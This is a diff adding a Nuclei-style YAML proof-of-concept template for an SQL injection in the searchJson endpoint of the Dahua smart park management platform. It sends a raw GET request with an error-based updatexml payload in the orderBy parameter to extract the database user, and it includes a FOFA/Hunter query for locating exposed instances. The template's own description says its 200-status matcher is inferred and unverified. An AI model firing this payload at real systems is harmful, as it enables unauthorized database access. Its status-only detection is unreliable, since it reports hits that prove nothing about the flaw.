@@ -1,0 +1,47 @@
+id: poc-29057e169a4ce9381ab1
+info:
+  name: 大华智慧园区综合管理平台searchJsonSQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/29057e169a4ce9381ab1fadd32b84eee
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 29057e169a4ce9381ab1fadd32b84eee
+    fofa: + hunter：`app.name="Dahua 大华 智慧园区管理平台"`
+http:
+- raw:
+  - 'GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: JSESSIONID=0B95DCE16676556E16169127452F23E1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Upgrade-Insecure-Requests: 1
+
+    Sec-Fetch-Dest: document
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: none
+
+    Sec-Fetch-User: ?1
+
+    Te: trailers
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
